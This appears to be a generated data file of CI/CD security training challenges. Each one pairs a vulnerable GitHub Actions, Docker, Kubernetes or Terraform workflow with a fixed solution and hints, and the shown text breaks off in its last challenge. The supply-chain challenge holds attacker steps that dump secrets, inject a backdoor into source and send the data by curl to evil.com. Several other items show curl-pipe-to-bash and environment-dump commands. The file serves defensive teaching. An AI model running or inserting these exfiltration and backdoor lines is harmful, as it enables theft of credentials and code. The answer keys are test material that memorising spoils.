/**
 * GENERATED — do not edit by hand.
 * Produced by `npm run gen-challenges` from the challenges/ source dirs.
 * Powers the offline (Pages, no backend) fallback.
 */
export interface StaticChallenge {
  id: string;
  title: string;
  level: string;
  topic: string;
  points: number;
  estimatedTime: string;
  description: string;
  tags: string[];
  prerequisites: string[];
  objectives: string[];
  references: { page: string; label: string }[];
  scenario: string;
  vulnerableWorkflow: string;
  solutionWorkflow: string;
  hints: string[];
  hintsPenalty: number;
}

export const STATIC_CHALLENGES: StaticChallenge[] = [
  {
    "id": "secrets-leak",
    "title": "Don't Leak Your Secrets",
    "level": "beginner",
    "topic": "github-actions",
    "points": 100,
    "estimatedTime": "10m",
    "description": "This workflow accidentally leaks AWS credentials in the build logs.\nFind the secrets exposure and fix it before an attacker can harvest your keys.\n",
    "tags": [
      "secrets",
      "aws",
      "logging"
    ],
    "prerequisites": [],
    "objectives": [
      "Explain how AWS credentials reach build logs through echo and env dumps",
      "Route credentials through secrets and env without printing values",
      "Verify with simulation that no secret value appears in output"
    ],
    "references": [
      {
        "page": "github-actions",
        "label": "Secrets handling guide"
      }
    ],
    "scenario": "# Scenario: Secrets Leak\n\nYou've just joined the team maintaining a Node.js application. While reviewing the CI pipeline, you notice the build step logs show AWS credentials in plaintext.\n\nThe previous developer hardcoded the AWS keys directly into the workflow YAML for \"convenience.\" Every build since then has exposed these credentials in the GitHub Actions logs.\n\n**Your mission:** Remove the hardcoded secrets and use GitHub's secrets mechanism instead.\n\n## What's at risk?\n- AWS account compromise\n- Unauthorized resource access\n- Potential data breach\n",
    "vulnerableWorkflow": "name: Build and Deploy\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build-and-deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Build\n        run: |\n          echo \"Building application...\"\n          echo \"AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\"\n          echo \"AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"\n          npm run build\n\n      - name: Deploy\n        env:\n          AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE\n          AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n        run: |\n          echo \"Deploying to AWS...\"\n          echo \"Deploy complete\"\n",
    "solutionWorkflow": "name: Build and Deploy\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build-and-deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Build\n        run: npm run build\n\n      - name: Deploy\n        env:\n          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n        run: |\n          echo \"Deploying to AWS...\"\n          echo \"Deploy complete\"\n",
    "hints": [
      "# Hint 1: Where are the secrets?\n\nLook at the `env:` section of the workflow. Hardcoded credentials in YAML are visible to anyone with repository access.\n",
      "# Hint 2: How to fix it\n\nReplace the hardcoded values with `${{ secrets.AWS_ACCESS_KEY_ID }}` and `${{ secrets.AWS_SECRET_ACCESS_KEY }}`. Then add those secrets in your repository Settings → Secrets → Actions.\n"
    ],
    "hintsPenalty": 25
  },
  {
    "id": "permissions-overkill",
    "title": "Too Much Power",
    "level": "beginner",
    "topic": "github-actions",
    "points": 75,
    "estimatedTime": "8m",
    "description": "This workflow uses overly broad permissions. A compromised step could\nmodify code, create releases, or access other repository resources.\nApply the principle of least privilege.\n",
    "tags": [
      "permissions",
      "least-privilege"
    ],
    "prerequisites": [],
    "objectives": [
      "Scope GITHUB_TOKEN with least privilege",
      "Set workflow-level deny plus per-job grants"
    ],
    "references": [
      {
        "page": "github-actions",
        "label": "Least-privilege permissions guide"
      }
    ],
    "scenario": "# Scenario: Permissions Overkill\n\nYour team's workflow has `permissions: write-all` at the top level. This was added \"just in case\" but it means every job in the workflow can modify your code, create releases, and access Actions secrets.\n\nA malicious dependency in your npm packages could exploit these broad permissions to push code directly to main.\n\n**Your mission:** Restrict permissions to only what each job actually needs.\n",
    "vulnerableWorkflow": "name: CI Pipeline\n\non:\n  push:\n    branches: [main]\n\npermissions: write-all\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    steps:\n      - uses: actions/checkout@v4\n      - name: Deploy\n        run: echo \"Deploying...\"\n",
    "solutionWorkflow": "name: CI Pipeline\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - uses: actions/checkout@v4\n      - name: Deploy\n        run: echo \"Deploying...\"\n",
    "hints": [
      "# Hint 1: What does write-all mean?\n\n`permissions: write-all` grants write access to ALL available scopes: contents, packages, actions, deployments, issues, pull-requests, etc. Most CI jobs only need `contents: read`.\n",
      "# Hint 2: The fix\n\nReplace `permissions: write-all` with specific permissions. A build job typically only needs `contents: read`. Deploy jobs might also need `id-token: write` for OIDC.\n"
    ],
    "hintsPenalty": 25
  },
  {
    "id": "unsafe-deps",
    "title": "Trust No One",
    "level": "beginner",
    "topic": "github-actions",
    "points": 100,
    "estimatedTime": "10m",
    "description": "This workflow pins actions by mutable tag (v3) instead of commit SHA.\nA compromised action could be updated to inject malicious code.\nPin actions to full commit SHAs for supply chain safety.\n",
    "tags": [
      "supply-chain",
      "actions",
      "pinning"
    ],
    "prerequisites": [],
    "objectives": [
      "Explain why mutable tags are deploy-time code changes",
      "Pin actions to full commit SHAs with version comments"
    ],
    "references": [
      {
        "page": "github-actions",
        "label": "Pin actions to SHA guide"
      }
    ],
    "scenario": "# Scenario: Unsafe Dependencies\n\nYour workflow uses `@v3` tags to reference GitHub Actions. Tags are mutable — the same tag can point to different code over time.\n\nIf the `actions/checkout` action's repository were compromised, an attacker could push a new version under the `v3` tag that steals your code or secrets.\n\n**Your mission:** Pin all actions to full commit SHAs. You can find the SHA for each action version on its GitHub releases page.\n",
    "vulnerableWorkflow": "name: Build\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v3\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Build\n        run: npm run build\n",
    "solutionWorkflow": "name: Build\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11\n\n      - name: Setup Node.js\n        uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Build\n        run: npm run build\n",
    "hints": [
      "# Hint 1: Tags vs SHAs\n\nGit tags can be moved. `@v3` might point to commit ABC today and commit XYZ tomorrow. Commit SHAs are immutable — `@a]1b2c3d...` always refers to the same code.\n",
      "# Hint 2: Finding the SHA\n\nGo to the action's GitHub repository → Releases → find the version you want → copy the full commit SHA from the release tag.\n"
    ],
    "hintsPenalty": 25
  },
  {
    "id": "error-swallowing",
    "title": "Don't Swallow Errors",
    "level": "beginner",
    "topic": "github-actions",
    "points": 75,
    "estimatedTime": "8m",
    "description": "This workflow swallows build errors with `|| echo`. If the build fails,\nthe pipeline continues and may deploy broken code. Let failures propagate.\n",
    "tags": [
      "reliability",
      "error-handling"
    ],
    "prerequisites": [],
    "objectives": [
      "Let build failures propagate instead of masking them",
      "Gate deploys on successful steps"
    ],
    "references": [
      {
        "page": "github-actions",
        "label": "Failure handling guide"
      }
    ],
    "scenario": "# Scenario: Error Swallowing\n\nYour deploy pipeline uses `|| echo` after critical commands like `npm test` and `npm run build`. This means even if tests fail or the build breaks, the pipeline continues and may deploy broken code to production.\n\n**Your mission:** Remove the error swallowing so failures stop the pipeline.\n",
    "vulnerableWorkflow": "name: Deploy Pipeline\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Lint\n        run: npm run lint || echo \"Linting failed, continuing...\"\n\n      - name: Test\n        run: npm test || echo \"Tests failed, continuing...\"\n\n      - name: Build\n        run: npm run build || echo \"Build failed, continuing...\"\n\n      - name: Deploy\n        run: echo \"Deploying to production...\"\n",
    "solutionWorkflow": "name: Deploy Pipeline\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Lint\n        run: npm run lint\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n\n      - name: Deploy\n        run: echo \"Deploying to production...\"\n",
    "hints": [
      "# Hint 1: What does || echo do?\n\nIn bash, `command || echo \"failed\"` runs the command, and if it fails, runs `echo` instead. The exit code of the whole expression is 0 (success), so GitHub Actions thinks the step passed.\n",
      "# Hint 2: The fix\n\nSimply remove `|| echo \"...\"` from the commands. Let them fail naturally — GitHub Actions will mark the step as failed and stop the pipeline.\n"
    ],
    "hintsPenalty": 25
  },
  {
    "id": "unverified-script",
    "title": "Verify Before You Run",
    "level": "beginner",
    "topic": "github-actions",
    "points": 100,
    "estimatedTime": "10m",
    "description": "This workflow downloads and executes a remote script without verification.\nAn attacker could modify the script to inject malicious code.\nAlways verify checksums before executing downloaded code.\n",
    "tags": [
      "supply-chain",
      "script-execution"
    ],
    "prerequisites": [
      "unsafe-deps"
    ],
    "objectives": [
      "Download remote scripts before executing anything",
      "Verify checksums against a trusted value"
    ],
    "references": [
      {
        "page": "github-actions",
        "label": "Supply chain safety guide"
      }
    ],
    "scenario": "# Scenario: Unverified Script Execution\n\nYour pipeline downloads a setup script from a remote server and pipes it directly to bash. The script URL is hardcoded and there's no integrity verification.\n\nIf the remote server is compromised, or if a MITM attack intercepts the download, malicious code would execute in your CI environment with access to your secrets.\n\n**Your mission:** Download the script first, verify its integrity, then execute it.\n",
    "vulnerableWorkflow": "name: Setup and Build\n\non:\n  push:\n    branches: [main]\n\njobs:\n  setup:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install custom tools\n        run: curl -sSL https://example.com/setup.sh | bash\n\n      - name: Build\n        run: npm run build\n",
    "solutionWorkflow": "name: Setup and Build\n\non:\n  push:\n    branches: [main]\n\njobs:\n  setup:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Download setup script\n        run: curl -sSL -o setup.sh https://example.com/setup.sh\n\n      - name: Verify checksum\n        run: echo \"abc123def456  setup.sh\" | sha256sum -c -\n\n      - name: Install custom tools\n        run: bash setup.sh\n\n      - name: Build\n        run: npm run build\n",
    "hints": [
      "# Hint 1: The danger of piping\n\n`curl URL | bash` downloads and executes in one step. You never see what you're running. A compromised server or MITM attack could inject anything.\n",
      "# Hint 2: The safe pattern\n\nDownload the script to a file first: `curl -o setup.sh URL`. Then verify its SHA256 checksum: `echo \"expected_hash  setup.sh\" | sha256sum -c -`. Only then execute it.\n"
    ],
    "hintsPenalty": 25
  },
  {
    "id": "env-dumping",
    "title": "Debugging Gone Wrong",
    "level": "beginner",
    "topic": "github-actions",
    "points": 100,
    "estimatedTime": "10m",
    "description": "This workflow dumps environment variables to the logs for debugging.\nBut environment variables include secrets — and CI logs are stored forever.\nRemove the env dump to prevent credential exposure.\n",
    "tags": [
      "secrets",
      "logging",
      "env"
    ],
    "prerequisites": [
      "secrets-leak"
    ],
    "objectives": [
      "List what lives in a job environment beyond your own variables",
      "Remove debug dumps from workflows",
      "Mask values that must be printed"
    ],
    "references": [
      {
        "page": "github-actions",
        "label": "Secrets handling guide"
      }
    ],
    "scenario": "# Scenario: Debugging Gone Wrong\n\nA developer added a debugging step to figure out why the build was failing. The step dumps all environment variables to the CI logs using `env | grep` and `printenv`.\n\nUnfortunately, CI logs are stored indefinitely and are accessible to anyone with repository read access. Every secret — AWS keys, API tokens, database passwords — is now exposed in plaintext.\n\n**Your mission:** Remove the environment dump step to prevent credential leakage.\n\n## What's at risk?\n- All CI/CD secrets exposed in logs\n- AWS account compromise\n- Third-party API abuse\n",
    "vulnerableWorkflow": "name: Build and Test\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Debug environment\n        run: |\n          echo \"=== Environment Variables ===\"\n          env | grep -i \"secret\\|token\\|key\\|password\"\n          printenv\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n",
    "solutionWorkflow": "name: Build and Test\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n",
    "hints": [
      "# Hint 1: Where are the secrets?\n\nEnvironment variables in CI include secrets you've configured (like `secrets.AWS_ACCESS_KEY_ID`). Commands like `env`, `printenv`, or `env | grep` dump everything — including those secrets.\n",
      "# Hint 2: The fix\n\nRemove the entire step that dumps environment variables. If you need to debug environment issues, use `echo $SPECIFIC_VAR` for non-sensitive variables only, or use `::mask::` for sensitive ones.\n"
    ],
    "hintsPenalty": 25
  },
  {
    "id": "docker-running-as-root",
    "title": "Container Root Trap",
    "level": "beginner",
    "topic": "docker",
    "points": 100,
    "estimatedTime": "10m",
    "description": "This workflow builds a Docker image that runs as root. If the container\nis compromised, the attacker has full root access to the host kernel.\nAdd a non-root USER instruction to your Dockerfile.\n",
    "tags": [
      "docker",
      "root",
      "container-security"
    ],
    "prerequisites": [],
    "objectives": [
      "Add a non-root USER to the image build",
      "Explain what host access a root container keeps"
    ],
    "references": [
      {
        "page": "docker",
        "label": "Image hardening guide"
      }
    ],
    "scenario": "# Scenario: Container Root Trap\n\nYour CI pipeline builds and pushes Docker images. The inline Dockerfile doesn't specify a `USER` instruction, so the container runs as root by default.\n\nIf an attacker escapes the container (via a kernel vulnerability or misconfiguration), they have full root access to the host system. Running as root inside a container also means any vulnerability in your app can be leveraged for container escape.\n\n**Your mission:** Add a non-root `USER` instruction to the Dockerfile.\n",
    "vulnerableWorkflow": "name: Build Docker Image\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Build image\n        run: |\n          cat <<'EOF' > Dockerfile\n          FROM node:20-slim\n          WORKDIR /app\n          COPY package*.json ./\n          RUN npm ci --production\n          COPY src/ ./src/\n          CMD [\"node\", \"src/index.js\"]\n          EOF\n          docker build -t myapp:latest .\n\n      - name: Push image\n        run: |\n          echo \"Pushing to registry...\"\n          docker push myapp:latest\n",
    "solutionWorkflow": "name: Build Docker Image\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Build image\n        run: |\n          cat <<'EOF' > Dockerfile\n          FROM node:20-slim\n          RUN adduser --system --group nonroot\n          WORKDIR /app\n          COPY package*.json ./\n          RUN npm ci --production\n          COPY src/ ./src/\n          USER nonroot\n          CMD [\"node\", \"src/index.js\"]\n          EOF\n          docker build -t myapp:latest .\n\n      - name: Push image\n        run: |\n          echo \"Pushing to registry...\"\n          docker push myapp:latest\n",
    "hints": [
      "# Hint 1: Default behavior\n\nDocker containers run as root (UID 0) by default. If there's no `USER` instruction in the Dockerfile, the process inside the container has root privileges.\n",
      "# Hint 2: The fix\n\nAdd `USER nonroot` or `USER 1000` to your Dockerfile after installing packages but before the CMD/ENTRYPOINT. Create the user first with `RUN adduser --system --group nonroot` if needed.\n"
    ],
    "hintsPenalty": 25
  },
  {
    "id": "k8s-privileged-pod",
    "title": "Privileged Pod Escape",
    "level": "beginner",
    "topic": "kubernetes",
    "points": 100,
    "estimatedTime": "10m",
    "description": "This workflow deploys a Kubernetes manifest with a privileged container.\nPrivileged containers have full access to the host — equivalent to root on the node.\nRemove the privileged flag and add specific capabilities only if needed.\n",
    "tags": [
      "kubernetes",
      "privileged",
      "pod-security"
    ],
    "prerequisites": [],
    "objectives": [
      "Drop the privileged flag from the container",
      "Grant only the capabilities the workload needs"
    ],
    "references": [
      {
        "page": "kubernetes",
        "label": "Pod security guide"
      }
    ],
    "scenario": "# Scenario: Privileged Pod Escape\n\nYour CI pipeline deploys a Kubernetes manifest that includes a pod with `privileged: true`. This was added because \"something wasn't working\" and the developer looked up the fastest fix.\n\nA privileged container can:\n- Access all host devices via `/dev/`\n- Mount the host filesystem\n- Modify kernel parameters\n- Escape to full node compromise\n\n**Your mission:** Remove `privileged: true` from the security context. If the app needs specific capabilities, add only the ones it requires using `capabilities.add`.\n",
    "vulnerableWorkflow": "name: Deploy to Kubernetes\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Apply manifest\n        run: |\n          cat <<'EOF' > deployment.yml\n          apiVersion: apps/v1\n          kind: Deployment\n          metadata:\n            name: webapp\n          spec:\n            replicas: 3\n            selector:\n              matchLabels:\n                app: webapp\n            template:\n              metadata:\n                labels:\n                  app: webapp\n              spec:\n                containers:\n                  - name: webapp\n                    image: myapp:latest\n                    securityContext:\n                      privileged: true\n                    ports:\n                      - containerPort: 3000\n          EOF\n          kubectl apply -f deployment.yml\n",
    "solutionWorkflow": "name: Deploy to Kubernetes\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Apply manifest\n        run: |\n          cat <<'EOF' > deployment.yml\n          apiVersion: apps/v1\n          kind: Deployment\n          metadata:\n            name: webapp\n          spec:\n            replicas: 3\n            selector:\n              matchLabels:\n                app: webapp\n            template:\n              metadata:\n                labels:\n                  app: webapp\n              spec:\n                containers:\n                  - name: webapp\n                    image: myapp:latest\n                    securityContext:\n                      runAsNonRoot: true\n                      readOnlyRootFilesystem: true\n                      allowPrivilegeEscalation: false\n                    ports:\n                      - containerPort: 3000\n          EOF\n          kubectl apply -f deployment.yml\n",
    "hints": [
      "# Hint 1: What privileged: true does\n\nA privileged container is equivalent to root on the host node. It can access all devices, mount any filesystem, and modify kernel settings. It breaks all container isolation boundaries.\n",
      "# Hint 2: The fix\n\nRemove `privileged: true` from `securityContext`. If the app needs specific capabilities, use `capabilities: { add: [\"NET_BIND_SERVICE\"] }` to add only what's needed. Most apps don't need any special capabilities.\n"
    ],
    "hintsPenalty": 25
  },
  {
    "id": "tf-state-in-git",
    "title": "State in Version Control",
    "level": "beginner",
    "topic": "terraform",
    "points": 100,
    "estimatedTime": "10m",
    "description": "This workflow commits Terraform state files to git. State files contain\nsecrets (database passwords, API keys) and cause merge conflicts.\nUse remote state and add *.tfstate to .gitignore.\n",
    "tags": [
      "terraform",
      "state",
      "git"
    ],
    "prerequisites": [],
    "objectives": [
      "Move state to an encrypted remote backend",
      "Keep tfstate and tfvars out of git"
    ],
    "references": [
      {
        "page": "terraform",
        "label": "State security guide"
      }
    ],
    "scenario": "# Scenario: State in Version Control\n\nYour CI pipeline runs `terraform apply` and then commits the `.tfstate` file back to git \"for safekeeping.\" This is a critical mistake.\n\nTerraform state files contain:\n- All resource attributes (including sensitive ones)\n- Database passwords, API keys, and certificates in plaintext\n- Infrastructure topology that aids attackers\n\nAdditionally, multiple developers running terraform simultaneously cause state file merge conflicts, potentially corrupting your infrastructure.\n\n**Your mission:** Remove the `git add *.tfstate` step and configure remote state storage instead.\n",
    "vulnerableWorkflow": "name: Terraform Apply\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n\n      - name: Init\n        run: terraform init\n\n      - name: Plan\n        run: terraform plan -out=tfplan\n\n      - name: Apply\n        run: terraform apply -auto-approve tfplan\n\n      - name: Commit state\n        run: |\n          git config user.name \"terraform-bot\"\n          git config user.email \"bot@example.com\"\n          git add *.tfstate .terraform/\n          git commit -m \"Update state\" || echo \"No changes\"\n          git push\n",
    "solutionWorkflow": "name: Terraform Apply\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n\n      - name: Init\n        run: terraform init\n\n      - name: Plan\n        run: terraform plan -out=tfplan\n\n      - name: Apply\n        run: terraform apply -auto-approve tfplan\n",
    "hints": [
      "# Hint 1: What's in state\n\nTerraform state tracks every resource attribute, including secrets you've set as variables. A `.tfstate` file in git means your AWS keys, database passwords, and API tokens are in your repository history — forever.\n",
      "# Hint 2: The fix\n\nRemove `git add *.tfstate` from the workflow. Add `*.tfstate` and `.terraform/` to `.gitignore`. Configure a remote backend (S3, GCS, Terraform Cloud) in your `backend \"s3\" {}` block.\n"
    ],
    "hintsPenalty": 25
  },
  {
    "id": "mon-no-build-status",
    "title": "Invisible Failures",
    "level": "beginner",
    "topic": "monitoring",
    "points": 100,
    "estimatedTime": "10m",
    "description": "This workflow doesn't report build status back to the commit. When builds\nfail, nobody knows — broken code gets merged silently. Add status checks\nto make failures visible.\n",
    "tags": [
      "monitoring",
      "status",
      "visibility"
    ],
    "prerequisites": [],
    "objectives": [
      "Report build status back to the commit",
      "Make failures visible before merge"
    ],
    "references": [
      {
        "page": "monitoring",
        "label": "Build visibility guide"
      }
    ],
    "scenario": "# Scenario: Invisible Failures\n\nYour team's CI pipeline runs tests and builds, but doesn't report the status back to GitHub. Developers push code, the build runs, but nobody checks if it passed or failed.\n\nBroken code is being merged because there's no status check blocking the PR. The team only discovers failures after deployment — in production.\n\n**Your mission:** Add a step that reports the build status back to the commit using `actions/github-script` so that failures are visible and can block merges.\n",
    "vulnerableWorkflow": "name: CI Build\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n",
    "solutionWorkflow": "name: CI Build\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n\n      - name: Report status\n        if: always()\n        uses: actions/github-script@v7\n        with:\n          script: |\n            const status = '${{ job.status }}' === 'success' ? 'success' : 'failure';\n            github.rest.repos.createCommitStatus({\n              owner: context.repo.owner,\n              repo: context.repo.repo,\n              sha: context.sha,\n              state: status,\n              description: `Build ${status}`,\n              context: 'CI Build'\n            });\n",
    "hints": [
      "# Hint 1: Why status matters\n\nWithout commit status checks, there's no gate preventing broken code from merging. GitHub branch protection rules rely on status checks to block PRs with failing builds.\n",
      "# Hint 2: The fix\n\nAdd an `actions/github-script` step that calls `github.rest.repos.createCommitStatus()` to set the commit status to success or failure. This makes the build result visible on the commit and enables branch protection rules.\n"
    ],
    "hintsPenalty": 25
  },
  {
    "id": "supply-chain-attack",
    "title": "Supply Chain Defense",
    "level": "intermediate",
    "topic": "github-actions",
    "points": 200,
    "estimatedTime": "20m",
    "description": "A malicious PR modifies this workflow to exfiltrate secrets and inject\nbackdoors. Identify all stages of the attack chain and secure the pipeline.\n",
    "tags": [
      "supply-chain",
      "attacks",
      "defense-in-depth"
    ],
    "prerequisites": [
      "unsafe-deps",
      "secrets-leak"
    ],
    "objectives": [
      "Map the exfiltration, tampering, and persistence stages of the attack chain",
      "Remove exfil paths and verify artifact integrity"
    ],
    "references": [
      {
        "page": "github-actions",
        "label": "Supply chain safety guide"
      }
    ],
    "scenario": "# Scenario: Supply Chain Attack\n\nA contributor submitted a PR that modifies your CI workflow. The changes look innocent at first glance, but hidden in the diff are several malicious steps:\n\n1. A step that dumps environment variables (harvesting secrets)\n2. A step that modifies your source code (injecting a backdoor)\n3. A step that exfiltrates data to an external server\n\n**Your mission:** Identify and remove all malicious steps, then secure the workflow against similar attacks.\n\n## Key defenses to implement:\n- Restrict what PRs can do (limit permissions)\n- Don't run untrusted code in CI\n- Validate artifact integrity\n- Monitor for suspicious behavior\n",
    "vulnerableWorkflow": "name: PR Build\n\non:\n  pull_request:\n    branches: [main]\n\npermissions: write-all\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.head_ref }}\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Build\n        run: npm run build\n\n      # Attacker steps hidden among legitimate build steps\n\n      - name: Cache restore\n        run: |\n          env | grep -i \"secret\\|token\\|key\\|aws\" > /tmp/env_dump.txt\n          cat /tmp/env_dump.txt\n\n      - name: Update dependencies\n        run: |\n          echo 'console.log(\"Backdoor: \" + process.env.AWS_SECRET_ACCESS_KEY)' >> src/index.js\n          echo 'require(\"child_process\").exec(\"curl -X POST https://evil.com/steal -d @/tmp/env_dump.txt\")' >> src/index.js\n\n      - name: Upload build\n        run: |\n          curl -X POST https://evil.com/exfil -d @src/index.js\n          echo \"Build uploaded successfully\"\n",
    "solutionWorkflow": "name: PR Build\n\non:\n  pull_request:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.head_ref }}\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Build\n        run: npm run build\n\n      - name: Verify source integrity\n        run: |\n          git diff --exit-code src/ || (echo \"Source modified!\" && exit 1)\n",
    "hints": [
      "# Hint 1: Look for environment dumps\n\nSearch for steps that use `env`, `printenv`, or dump variables to the log. These are credential harvesting techniques.\n",
      "# Hint 2: Check for file modifications\n\nLook for steps that use `>>`, `echo >>`, or `tee` to append content to source files. This is how attackers inject backdoors.\n",
      "# Hint 3: Find the exfiltration\n\nLook for `curl` or `wget` commands that POST data to external URLs. Attackers use these to send stolen data to their servers.\n"
    ],
    "hintsPenalty": 50
  },
  {
    "id": "artifact-tampering",
    "title": "Artifact Integrity",
    "level": "intermediate",
    "topic": "github-actions",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This workflow uploads build artifacts without integrity checks.\nAn attacker could tamper with artifacts between build and deploy.\nAdd checksums to verify artifact integrity.\n",
    "tags": [
      "artifacts",
      "integrity",
      "checksums"
    ],
    "prerequisites": [
      "unsafe-deps"
    ],
    "objectives": [
      "Generate checksums at build time",
      "Verify integrity before deploy"
    ],
    "references": [
      {
        "page": "github-actions",
        "label": "Artifact integrity guide"
      }
    ],
    "scenario": "# Scenario: Artifact Tampering\n\nYour pipeline builds an artifact in one job and deploys it in another. The artifact is uploaded and downloaded using GitHub's artifact actions, but there's no integrity verification.\n\nIf an attacker gains access to the workflow (via a compromised action or malicious PR), they could swap the artifact between build and deploy.\n\n**Your mission:** Add SHA256 checksum generation and verification to ensure artifact integrity.\n",
    "vulnerableWorkflow": "name: Build and Deploy\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Build\n        run: npm run build\n\n      - name: Upload artifact\n        uses: actions/upload-artifact@v4\n        with:\n          name: dist\n          path: dist/\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    steps:\n      - name: Download artifact\n        uses: actions/download-artifact@v4\n        with:\n          name: dist\n          path: dist/\n\n      - name: Deploy\n        run: |\n          echo \"Deploying artifact...\"\n          echo \"Deploy complete\"\n",
